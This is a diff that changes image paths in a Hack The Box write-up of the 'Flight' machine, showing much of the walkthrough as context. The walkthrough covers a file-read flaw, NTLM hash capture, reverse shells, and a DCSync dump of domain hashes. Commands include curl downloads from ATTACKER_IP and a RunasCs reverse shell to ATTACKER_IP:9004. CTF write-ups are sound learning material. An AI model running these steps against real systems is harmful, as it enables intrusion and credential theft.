@@ -54,11 +54,11 @@ Looks like a Windows machine with Active Directory components installed on it. L
 
 As there is a web server on port 80, I will fire up Gobuster to find subdirectories/subdomains for the website in the background before moving on. Testing for Anonymous and Guest authentication over SMB and RPC show that both are disabled, meaning we don't have a great way to enumerate users just yet.
 
-![](../assets/img/2026-03-01-Flight/1.png)
+![](/assets/img/2026-03-01-Flight/1.png)
 
 Another interesting thing is that it's running Apache with PHP instead of the usual Microsoft IIS server, so I'll fuzz for common PHP pages as well. Checking out the landing page on port 80 shows an entirely static website for an airliner with dead links everywhere. No accessible directories or anything in the source code either, so I can safely rule out this site.
 
-![](../assets/img/2026-03-01-Flight/2.png)
+![](/assets/img/2026-03-01-Flight/2.png)
 
 My scans return a school subdomain for the site which also seems pretty barren, except for one part.
 
@@ -94,25 +94,25 @@ school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Durati
 ## Arbitrary File Read
 This page is also mostly static except for the header tabs that reveal that the page loads different HTML through a view parameter in the index page. This website structure is notorious for path traversal and LFI, so let's test it out with a few simple payloads.
 
-![](../assets/img/2026-03-01-Flight/3.png)
+![](/assets/img/2026-03-01-Flight/3.png)
 
 Attempting to navigate up one directory to proc an error on the page shows that the site has prepared for this and has blocked us. Single and even double URL-encoding the forward slashes doesn't work to bypass this filter.
 
-![](../assets/img/2026-03-01-Flight/4.png)
+![](/assets/img/2026-03-01-Flight/4.png)
 
 Next, I tried including the `index.php` page itself in hopes that we would be able to figure out how the page accepts input or if it's blacklisting any bad characters. Luckily we don't get an error for re-inclusion, but the full source code which shows a few interesting things.
 
 First, the view parameter is blacklisting path traversal characters, so we won't be able to get around the system that way. The second is that it simply performs `$_GET` to read the file contents and doesn't filter anything there. Lastly, we can see the full file path to the `home.html` page which discloses where we are in the filesystem.
 
-![](../assets/img/2026-03-01-Flight/5.png)
+![](/assets/img/2026-03-01-Flight/5.png)
 
 So path traversal doesn't work since supplying `..` or `\\` in our URL will get blocked, but maybe we can just specify the full path to the file like it shows within the source code. Windows will still accept forward slashes when providing file paths and by including a known page, we can confirm that this parameter is vulnerable to arbitrary file reads.
 
-![](../assets/img/2026-03-01-Flight/6.png)
+![](/assets/img/2026-03-01-Flight/6.png)
 
 Next, I want to figure out if this will reach out to remote machines in order to read them too. We know that the site uses `file_get_contents` to display what's inside of them so getting a shell via PHP code will not be possible.
 
-![](../assets/img/2026-03-01-Flight/7.png)
+![](/assets/img/2026-03-01-Flight/7.png)
 
 Alright, that works to display our text file which shows that the HTTP protocol works. If we have it try to reach an attacker-owned SMB server, it will attempt to authenticate beforehand and we'll be able to grab an NTLM hash for whoever's running the server.
 
@@ -122,12 +122,12 @@ Let's give it a shot. I setup a Responder server over my VPN connection and then
 sudo Responder -I tun0
 ```
 
-![](../assets/img/2026-03-01-Flight/8.png)
+![](/assets/img/2026-03-01-Flight/8.png)
 
 ## Password Reuse
 I send that hash over to JohnTheRipper in order to get the plaintext version, then use it to authenticate over SMB. Since as we have valid credentials now, I'll brute force RIDs to get a list of valid usernames on the box and check if the recovered password was reused or a default for the domain.
 
-![](../assets/img/2026-03-01-Flight/9.png)
+![](/assets/img/2026-03-01-Flight/9.png)
 
 ```
 #Saving RID brute force output to file
@@ -139,12 +139,12 @@ sed -n 's/.*\\\([^ ]*\).*/\1/p' users.txt > validnames.txt
 
 Spraying that password against that list returns a successful result for the `S.Moon` user.
 
-![](../assets/img/2026-03-01-Flight/10.png)
+![](/assets/img/2026-03-01-Flight/10.png)
 
 ## Stealing NTLM Hashes
 WinRM access for that account is disabled, however they do have quite a few permissions for SMB shares. Nothing of importance was inside of these, but the fact that we could write to 'Shared' could be useful. Since there were no login pages or other sensitive services to authenticate to using these credentials, this share was the only thing to go off of.
 
-![](../assets/img/2026-03-01-Flight/11.png)
+![](/assets/img/2026-03-01-Flight/11.png)
 
 Judging by the name of it as well as the Users share, we can infer that other accounts may access this in order to read content or store their own files on it. We can perform a similar attack to the remote file read vulnerability earlier by forcing users that open a file that will load an external resource on our machine, therefore authenticating over SMB.
 
@@ -165,29 +165,29 @@ python3 ntlm_theft.py -s [ATTACKER_IP] -f pwn -g all
 
 Many are blocked but a few do make it through. After setting up the Responder server and waiting a minute, we get a hit back from the user `C.Bum`.
 
-![](../assets/img/2026-03-01-Flight/12.png)
+![](/assets/img/2026-03-01-Flight/12.png)
 
 Sending that hash over to JohnTheRipper to get a plaintext variant works and I repeat enumeration for this user.
 
-![](../assets/img/2026-03-01-Flight/13.png)
+![](/assets/img/2026-03-01-Flight/13.png)
 
 ## Reverse Shell over SMB Share
 Looks like this person has write access to the Web share this time which contains all files for both of the site's virtual hosts. I'll repeat the earlier steps to steal NTLM hashes for good measure, but we should just be able to upload a PHP reverse shell to a public directory on one of the site's to get terminal access as `svc_apache`.
 
 Past enumeration revealed that the `/images` directory under the school subdomain didn't respond with a `403 Forbidden` code, so I'll upload mine in there.
 
-![](../assets/img/2026-03-01-Flight/14.png)
+![](/assets/img/2026-03-01-Flight/14.png)
 
 Navigating to it after a successful upload on SMB and setting up a Netcat listener grants us a shell as the Apache service on the system.
 
-![](../assets/img/2026-03-01-Flight/15.png)
+![](/assets/img/2026-03-01-Flight/15.png)
 
 ## Privilege Escalation
 With a proper shell on the box, we can start internal enumeration to look for routes to escalate privileges. Checking the users directory shows that `C.Bum` is the only other user on the box besides Administrator. Since he had access to change the website's files, I'm going to assume that he's the developer and we may need to pivot to his account before going further.
 
 There weren't many interesting things on the filesystem except for one particular directory. `C:\Inetpub` is the default directory for Microsoft IIS server to run out of, but the only sites that we could reach were Apache, which intrigued me. Checking inside of the folder revealed a development directory that held some standard JS, CSS, and HTML files. Using icacls shows that `C.Bum` has write permissions to this directory which may be our key to root if there happens to be some kind of insecure script backing it up.
 
-![](../assets/img/2026-03-01-Flight/16.png)
+![](/assets/img/2026-03-01-Flight/16.png)
 
 ### Pivoting with RunasCs
 Problem is, we still don't have a shell as `C.Bum` even though we know his credentials since he isn't apart of the Remote Users group. I recently discovered a utility named [RunasCs](https://github.com/antonioCoco/RunasCs) that will let us run certain processes  as other users if given valid credentials. It's an upgraded version of the built-in `runas.exe` that also solves many prior issues with just using that one.
@@ -202,12 +202,12 @@ curl http://ATTACKER_IP/RunasCs.exe -o r.exe
 .\r.exe C.Bum [REDACTED] -r ATTACKER_IP:9004 cmd
 ```
 
-![](../assets/img/2026-03-01-Flight/17.png)
+![](/assets/img/2026-03-01-Flight/17.png)
 
 ### ASPX Shell via Internal Web Server
 At this point, we can grab the user flag under his Desktop directory and start investigating the development website. Listing all ports that are listening for TCP on the system gives us quite a lot of output, but we're looking for anything that may be running internally and wasn't reachable during initial enumeration.
 
-![](../assets/img/2026-03-01-Flight/18.png)
+![](/assets/img/2026-03-01-Flight/18.png)
 
 Port 8000 stands out to me as it's typically used to host development sites before pushing to production, and the fact that it didn't show up in our Nmap scans. I'll upload [Chisel](https://github.com/jpillora/chisel) in order to reach it from my local machine. 
 
@@ -226,20 +226,20 @@ curl http://ATTACKER_IP/chisel -o chisel.exe
 
 Once that's taken care of, we can reach the site with our browser on localhost. This shows yet another static page for booking flights with the airline.
 
-![](../assets/img/2026-03-01-Flight/19.png)
+![](/assets/img/2026-03-01-Flight/19.png)
 
 It doesn't really matter if this site is vulnerable as we already figured out that have access to write to the development directory. Using the shell as `C.Bum`, we can write an `.aspx` reverse shell (default for IIS) to a reachable directory and pivot to whomever is running this service. I grab a PoC from this [Github repository](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx) and upload it over SMB as there's not really a neat way to copy/paste it to our shell.
 
-![](../assets/img/2026-03-01-Flight/20.png)
+![](/assets/img/2026-03-01-Flight/20.png)
 
 After setting up a listener and navigating to the file on the website, we are granted a shell as `defaultapppool`.
 
-![](../assets/img/2026-03-01-Flight/21.png)
+![](/assets/img/2026-03-01-Flight/21.png)
 
 ### DCSync Attack
 Our current account is a Microsoft Virtual Account, meaning that if it were to attempt to authenticate over a network, it has no choice other than to fall back to the computer account. In our case it's named `G0$`, however these machine accounts aren't meant to be accessed by people and therefore have incredibly long and complex passwords, so we won't be able to crack it. 
 
-![](../assets/img/2026-03-01-Flight/22.png)
+![](/assets/img/2026-03-01-Flight/22.png)
 
 Instead of trying to get plaintext credentials the conventional way, we can use this fact that our account falls back to `G0$` in order to make a ticket request for the machine account. I'll use [Rubeus](https://github.com/GhostPack/Rubeus) for this next step due to it being very reliable for all things Kerberos-related. We just want to request a fake delegation ticket-granting-ticket so that we have everything for a DCSync attack.
 
@@ -247,7 +247,7 @@ Instead of trying to get plaintext credentials the conventional way, we can use 
 .\Rubeus.exe tgtdeleg
 ```
 
-![](../assets/img/2026-03-01-Flight/23.png)
+![](/assets/img/2026-03-01-Flight/23.png)
 
 With a valid ticket for the `G0$` machine account, we can now move on. If you're unfamiliar, a DCSync attack abuses Active Directory's replication feature to impersonate a domain controller and dump password hashes for any domain user. With the right privileges, an attacker can quietly extract credentials without touching the domain controller itself. 
 
@@ -276,10 +276,10 @@ $ sudo rdate -n flight.htb
 
 Once our clock skew is aligned with the domain controller's, we just need to run SecretsDump to extract all user hashes on the system.
 
-![](../assets/img/2026-03-01-Flight/24.png)
+![](/assets/img/2026-03-01-Flight/24.png)
 
 Finally, utilizing a pass-the-hash attack in order to WinRM onto the box will give us full access over the domain and we can grab the final flag under the admin's desktop folder to complete the challenge.
 
-![](../assets/img/2026-03-01-Flight/25.png)
+![](/assets/img/2026-03-01-Flight/25.png)
 
 That's all y'all, this box was very challenging for me because even though I knew most of the material, there wasn't much to go off of at times. Huge thanks to [Geiseric](https://app.hackthebox.com/users/184611) and [JDgodd](https://app.hackthebox.com/users/481778?profile-top-tab=machines&ownership-period=1M&profile-bottom-tab=prolabs) for creating this fantastic box. I hope this was helpful to anyone following along or stuck and happy hacking!
